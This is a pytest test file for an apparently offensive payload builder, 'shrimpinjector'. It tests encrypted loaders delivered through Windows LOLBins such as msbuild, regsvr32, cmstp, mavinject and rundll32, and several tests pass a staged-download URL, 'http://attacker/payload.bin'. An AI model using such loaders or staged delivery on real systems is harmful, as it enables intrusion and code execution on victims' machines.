import os
import shutil
import tempfile
import types

import pytest

from shrimpinjector.payloads import PAYLOAD_BUILDERS

DUMMY_ASSEMBLY = b"\x4d\x5a" + os.urandom(64)
DUMMY_SHELLCODE = os.urandom(128)

PLACEHOLDERS = [
    "YOURPAYLOADHERE",
    "YOURKEYHERE",
    "YOURIVHERE",
    "YOURKEYINGHERE",
    "YOURSALTHERE",
    "YOURTYPEHERE",
    "YOURMETHODHERE",
    "YOURARGS",
    "YOURSCTPATHHERE",
    "YOURSTAGEDURL",
]

AES_RESIDUE_TERMS = [
    "AesDecrypt",
    "RijndaelManaged",
    "DeriveKey",
]

CSHARP_TYPES = ["msbuild", "installutil", "regasm", "regsvcs", "csc"]
VBS_TYPES = ["vbscript", "hta", "regsvr32", "wmic", "pcalua"]
SCT_INF_TYPES = ["cmstp", "infdefaultinstall"]
PS_TYPES = ["powershell", "syncappvpub"]
NATIVE_DLL_TYPES = ["control", "msiexec", "odbcconf", "mavinject", "te"]
SPECIAL_TYPES = ["shellcode", "certutil", "workflow", "csi", "rundll32"]

SUPPORTS_XOR = (
    CSHARP_TYPES + VBS_TYPES + SCT_INF_TYPES + PS_TYPES
    + NATIVE_DLL_TYPES + ["rundll32", "csi"]
)


@pytest.fixture(autouse=True)
def output_dir(tmp_path):
    """Redirect all output to a temp dir and clean up."""
    import shrimpinjector.payloads as mod
    orig = mod.OUTPUT_DIR
    mod.OUTPUT_DIR = str(tmp_path / "output")
    os.makedirs(mod.OUTPUT_DIR, exist_ok=True)
    yield tmp_path
    mod.OUTPUT_DIR = orig


@pytest.fixture
def assembly_file(tmp_path):
    p = tmp_path / "test_assembly.exe"
    p.write_bytes(DUMMY_ASSEMBLY)
    return str(p)


@pytest.fixture
def shellcode_file(tmp_path):
    p = tmp_path / "test_shellcode.bin"
    p.write_bytes(DUMMY_SHELLCODE)
    return str(p)


def _make_args(assembly_path, encryption="aes", **overrides):
    args = types.SimpleNamespace(
        assembly=assembly_path,
        encryption=encryption,
        key=None,
        iv=None,
        output=None,
        template=None,
        compile=False,
        keying=None,
        type=None,
        method=None,
        staged=None,
        listener=None,
    )
    for k, v in overrides.items():
        setattr(args, k, v)
    return args


def _make_shellcode_args(shellcode_path, **overrides):
    args = types.SimpleNamespace(
        shellcode=shellcode_path,
        output=None,
        template=None,
        xor=False,
        xor_key=None,
        no_wait=False,
    )
    for k, v in overrides.items():
        setattr(args, k, v)
    return args


def _collect_output_files(tmp_path):
    """Return contents of all generated files as {filename: content}."""
    results = {}
    output_dir = tmp_path / "output"
    if output_dir.exists():
        for f in output_dir.rglob("*"):
            if f.is_file():
                try:
                    results[f.name] = f.read_text(errors="replace")
                except Exception:
                    results[f.name] = f.read_bytes().decode("latin-1")
    return results


def _check_no_placeholders(content, filename, allowed=None):
    allowed = set(allowed or [])
    for ph in PLACEHOLDERS:
        if ph in allowed:
            continue
        assert ph not in content, (
            f"Placeholder '{ph}' found in {filename}"
        )


def _check_no_aes_residue(content, filename):
    for term in AES_RESIDUE_TERMS:
        assert term not in content, (
            f"AES residue '{term}' found in {filename} (XOR mode)"
        )


# ---------------------------------------------------------------------------
# C# LOLBin payloads (Strategy A)
# ---------------------------------------------------------------------------

class TestCSharpPayloads:

    @pytest.mark.parametrize("payload_type", CSHARP_TYPES)
    def test_aes_no_placeholders(self, payload_type, assembly_file, output_dir):
        args = _make_args(assembly_file, encryption="aes")
        PAYLOAD_BUILDERS[payload_type](args, [])
        files = _collect_output_files(output_dir)
        assert len(files) >= 1, f"{payload_type} produced no output"
        for fname, content in files.items():
            _check_no_placeholders(content, fname)

    @pytest.mark.parametrize("payload_type", CSHARP_TYPES)
    def test_xor_no_placeholders(self, payload_type, assembly_file, output_dir):
        args = _make_args(assembly_file, encryption="xor")
        PAYLOAD_BUILDERS[payload_type](args, [])
        files = _collect_output_files(output_dir)
        assert len(files) >= 1
        for fname, content in files.items():
            _check_no_placeholders(content, fname)

    @pytest.mark.parametrize("payload_type", CSHARP_TYPES)
    def test_xor_no_aes_residue(self, payload_type, assembly_file, output_dir):
        args = _make_args(assembly_file, encryption="xor")
        PAYLOAD_BUILDERS[payload_type](args, [])
        files = _collect_output_files(output_dir)
        for fname, content in files.items():
            _check_no_aes_residue(content, fname)

    @pytest.mark.parametrize("payload_type", CSHARP_TYPES)
    def test_xor_has_xor_decrypt(self, payload_type, assembly_file, output_dir):
        args = _make_args(assembly_file, encryption="xor")
        PAYLOAD_BUILDERS[payload_type](args, [])
        files = _collect_output_files(output_dir)
        primary = list(files.values())[0]
        assert "XorDecrypt" in primary, f"{payload_type} XOR output missing XorDecrypt method"


# ---------------------------------------------------------------------------
# VBS-family payloads (Strategy C)
# ---------------------------------------------------------------------------

class TestVBSPayloads:

    @pytest.mark.parametrize("payload_type", VBS_TYPES)
    def test_aes_no_placeholders(self, payload_type, assembly_file, output_dir):
        args = _make_args(assembly_file, encryption="aes")
        PAYLOAD_BUILDERS[payload_type](args, [])
        files = _collect_output_files(output_dir)
        assert len(files) >= 1
        for fname, content in files.items():
            _check_no_placeholders(content, fname)

    @pytest.mark.parametrize("payload_type", VBS_TYPES)
    def test_xor_no_placeholders(self, payload_type, assembly_file, output_dir):
        args = _make_args(assembly_file, encryption="xor")
        PAYLOAD_BUILDERS[payload_type](args, [])
        files = _collect_output_files(output_dir)
        assert len(files) >= 1
        for fname, content in files.items():
            _check_no_placeholders(content, fname)

    @pytest.mark.parametrize("payload_type", VBS_TYPES)
    def test_xor_no_aes_block(self, payload_type, assembly_file, output_dir):
        args = _make_args(assembly_file, encryption="xor")
        PAYLOAD_BUILDERS[payload_type](args, [])
        files = _collect_output_files(output_dir)
        for fname, content in files.items():
            assert "DECRYPT_AES_START" not in content, (
                f"AES block marker left in {fname} (XOR mode)"
            )
            assert "RijndaelManaged" not in content


# ---------------------------------------------------------------------------
# SCT + INF pair payloads (CMSTP, InfDefaultInstall)
# ---------------------------------------------------------------------------

class TestSCTINFPayloads:

    @pytest.mark.parametrize("payload_type", SCT_INF_TYPES)
    def test_generates_both_files(self, payload_type, assembly_file, output_dir):
        args = _make_args(assembly_file, encryption="aes")
        PAYLOAD_BUILDERS[payload_type](args, [])
        files = _collect_output_files(output_dir)
        extensions = {os.path.splitext(f)[1] for f in files}
        assert ".sct" in extensions, f"{payload_type} missing .sct"
        assert ".inf" in extensions, f"{payload_type} missing .inf"

    @pytest.mark.parametrize("payload_type", SCT_INF_TYPES)
    def test_inf_references_sct(self, payload_type, assembly_file, output_dir):
        args = _make_args(assembly_file, encryption="aes")
        PAYLOAD_BUILDERS[payload_type](args, [])
        files = _collect_output_files(output_dir)
        inf_content = next(v for k, v in files.items() if k.endswith(".inf"))
        sct_name = next(k for k in files if k.endswith(".sct"))
        assert sct_name in inf_content, (
            f"INF does not reference SCT filename '{sct_name}'"
        )

    @pytest.mark.parametrize("payload_type", SCT_INF_TYPES)
    def test_custom_output_consistent_naming(self, payload_type, assembly_file, output_dir):
        custom = str(output_dir / "output" / "custom_name.inf")
        args = _make_args(assembly_file, encryption="aes", output=custom)
        PAYLOAD_BUILDERS[payload_type](args, [])
        assert os.path.exists(custom), "INF not at custom -o path"
        sct = custom.replace(".inf", ".sct")
        assert os.path.exists(sct), "SCT not derived from INF path"

    @pytest.mark.parametrize("payload_type", SCT_INF_TYPES)
    def test_no_placeholders(self, payload_type, assembly_file, output_dir):
        args = _make_args(assembly_file, encryption="aes")
        PAYLOAD_BUILDERS[payload_type](args, [])
        files = _collect_output_files(output_dir)
        for fname, content in files.items():
            _check_no_placeholders(content, fname)


# ---------------------------------------------------------------------------
# PowerShell-family payloads (Strategy B)
# ---------------------------------------------------------------------------

class TestPSPayloads:

    @pytest.mark.parametrize("payload_type", PS_TYPES)
    def test_aes_no_placeholders(self, payload_type, assembly_file, output_dir):
        args = _make_args(assembly_file, encryption="aes")
        PAYLOAD_BUILDERS[payload_type](args, [])
        files = _collect_output_files(output_dir)
        assert len(files) >= 1
        for fname, content in files.items():
            _check_no_placeholders(content, fname)

    @pytest.mark.parametrize("payload_type", PS_TYPES)
    def test_xor_no_placeholders(self, payload_type, assembly_file, output_dir):
        args = _make_args(assembly_file, encryption="xor")
        PAYLOAD_BUILDERS[payload_type](args, [])
        files = _collect_output_files(output_dir)
        for fname, content in files.items():
            _check_no_placeholders(content, fname)

    @pytest.mark.parametrize("payload_type", PS_TYPES)
    def test_xor_no_aes_blocks(self, payload_type, assembly_file, output_dir):
        args = _make_args(assembly_file, encryption="xor")
        PAYLOAD_BUILDERS[payload_type](args, [])
        files = _collect_output_files(output_dir)
        for fname, content in files.items():
            assert "DECRYPT_AES" not in content
            assert "AesDecrypt" not in content


# ---------------------------------------------------------------------------
# Native DLL payloads (Strategy E)
# ---------------------------------------------------------------------------

class TestNativeDLLPayloads:

    @pytest.mark.parametrize("payload_type", NATIVE_DLL_TYPES)
    def test_aes_no_placeholders(self, payload_type, assembly_file, output_dir):
        args = _make_args(assembly_file, encryption="aes")
        PAYLOAD_BUILDERS[payload_type](args, [])
        files = _collect_output_files(output_dir)
        assert len(files) >= 1
        for fname, content in files.items():
            _check_no_placeholders(content, fname)

    @pytest.mark.parametrize("payload_type", NATIVE_DLL_TYPES)
    def test_xor_no_placeholders(self, payload_type, assembly_file, output_dir):
        args = _make_args(assembly_file, encryption="xor")
        PAYLOAD_BUILDERS[payload_type](args, [])
        files = _collect_output_files(output_dir)
        for fname, content in files.items():
            _check_no_placeholders(content, fname)

    @pytest.mark.parametrize("payload_type", NATIVE_DLL_TYPES)
    def test_xor_no_aes_blocks(self, payload_type, assembly_file, output_dir):
        args = _make_args(assembly_file, encryption="xor")
        PAYLOAD_BUILDERS[payload_type](args, [])
        files = _collect_output_files(output_dir)
        for fname, content in files.items():
            assert "DECRYPT_AES_START" not in content

    @pytest.mark.parametrize("payload_type", ["mavinject", "te"])
    def test_dllmain_execute_uncommented(self, payload_type, assembly_file, output_dir):
        args = _make_args(assembly_file, encryption="aes")
        PAYLOAD_BUILDERS[payload_type](args, [])
        files = _collect_output_files(output_dir)
        cpp = next(v for k, v in files.items() if k.endswith(".cpp"))
        assert "Execute();" in cpp, f"{payload_type} missing Execute() call in DllMain"
        assert "// Execute();" not in cpp, f"{payload_type} DllMain Execute() still commented"


# ---------------------------------------------------------------------------
# Special payloads
# ---------------------------------------------------------------------------

class TestSpecialPayloads:

    def test_shellcode_aes_no_placeholders(self, shellcode_file, output_dir):
        args = _make_shellcode_args(shellcode_file)
        PAYLOAD_BUILDERS["shellcode"](args, [])
        files = _collect_output_files(output_dir)
        assert len(files) >= 1
        for fname, content in files.items():
            assert "PAYLOADCHUNKS" not in content

    def test_shellcode_xor(self, shellcode_file, output_dir):
        args = _make_shellcode_args(shellcode_file, xor=True)
        PAYLOAD_BUILDERS["shellcode"](args, [])
        files = _collect_output_files(output_dir)
        primary = list(files.values())[0]
        assert "xKey" in primary or "XOR" in primary or "Xor" in primary

    def test_certutil_encoding(self, assembly_file, output_dir):
        args = _make_args(assembly_file)
        PAYLOAD_BUILDERS["certutil"](args, [])
        files = _collect_output_files(output_dir)
        assert len(files) == 1
        content = list(files.values())[0]
        assert "-----BEGIN CERTIFICATE-----" in content
        assert "-----END CERTIFICATE-----" in content

    def test_workflow_generates_all_files(self, assembly_file, output_dir):
        args = _make_args(assembly_file, encryption="aes")
        args.output = str(output_dir / "output")
        PAYLOAD_BUILDERS["workflow"](args, [])
        files = _collect_output_files(output_dir)
        extensions = {os.path.splitext(f)[1] for f in files}
        assert ".cs" in extensions
        assert ".xoml" in extensions
        assert ".xml" in extensions

    def test_csi_aes(self, assembly_file, output_dir):
        args = _make_args(assembly_file, encryption="aes")
        PAYLOAD_BUILDERS["csi"](args, [])
        files = _collect_output_files(output_dir)
        assert any(k.endswith(".csx") for k in files)

    def test_csi_xor(self, assembly_file, output_dir):
        args = _make_args(assembly_file, encryption="xor")
        PAYLOAD_BUILDERS["csi"](args, [])
        files = _collect_output_files(output_dir)
        content = list(files.values())[0]
        assert "YOURPAYLOADHERE" not in content
        assert "YOURKEYHERE" not in content

    def test_rundll32(self, assembly_file, output_dir):
        args = _make_args(assembly_file, encryption="aes")
        PAYLOAD_BUILDERS["rundll32"](args, [])
        files = _collect_output_files(output_dir)
        assert any(k.endswith(".sct") for k in files)
        for fname, content in files.items():
            _check_no_placeholders(content, fname)


# ---------------------------------------------------------------------------
# MSBuild-specific (staged blocked for XOR, listener mode)
# ---------------------------------------------------------------------------

class TestMSBuild:

    def test_staged_xor_blocked(self, assembly_file, output_dir):
        args = _make_args(
            assembly_file, encryption="xor",
            staged="http://attacker/payload.bin",
        )
        with pytest.raises(SystemExit):
            PAYLOAD_BUILDERS["msbuild"](args, [])

    def test_aes_staged(self, assembly_file, output_dir):
        args = _make_args(
            assembly_file, encryption="aes",
            staged="http://attacker/payload.bin",
        )
        PAYLOAD_BUILDERS["msbuild"](args, [])
        files = _collect_output_files(output_dir)
        assert len(files) >= 1

    def test_xor_no_staged_url(self, assembly_file, output_dir):
        args = _make_args(assembly_file, encryption="xor")
        PAYLOAD_BUILDERS["msbuild"](args, [])
        files = _collect_output_files(output_dir)
        content = list(files.values())[0]
        assert "STAGED_URL" not in content
        assert "FetchPayload" not in content


# ---------------------------------------------------------------------------
# VBScript/HTA staged delivery
# ---------------------------------------------------------------------------

class TestStagedVBS:

    @pytest.mark.parametrize("payload_type", ["vbscript", "hta"])
    def test_staged_aes(self, payload_type, assembly_file, output_dir):
        args = _make_args(
            assembly_file, encryption="aes",
            staged="http://attacker/payload.bin",
        )
        PAYLOAD_BUILDERS[payload_type](args, [])
        files = _collect_output_files(output_dir)
        assert any(k.endswith(".bin") for k in files), "Missing staged .bin file"
        dropper = next(v for k, v in files.items() if not k.endswith(".bin"))
        assert "YOURSTAGEDURL" not in dropper
        assert "YOURPAYLOADHERE" not in dropper


# ---------------------------------------------------------------------------
# Cross-cutting: every payload type generates at least one file
# ---------------------------------------------------------------------------

class TestAllPayloads:

    @pytest.mark.parametrize("payload_type", sorted(
        set(PAYLOAD_BUILDERS.keys()) - {"shellcode", "certutil"}
    ))
    def test_generates_output(self, payload_type, assembly_file, output_dir):
        args = _make_args(assembly_file, encryption="aes")
        if payload_type == "workflow":
            args.output = str(output_dir / "output")
        PAYLOAD_BUILDERS[payload_type](args, [])
        files = _collect_output_files(output_dir)
        assert len(files) >= 1, f"{payload_type} produced no output files"
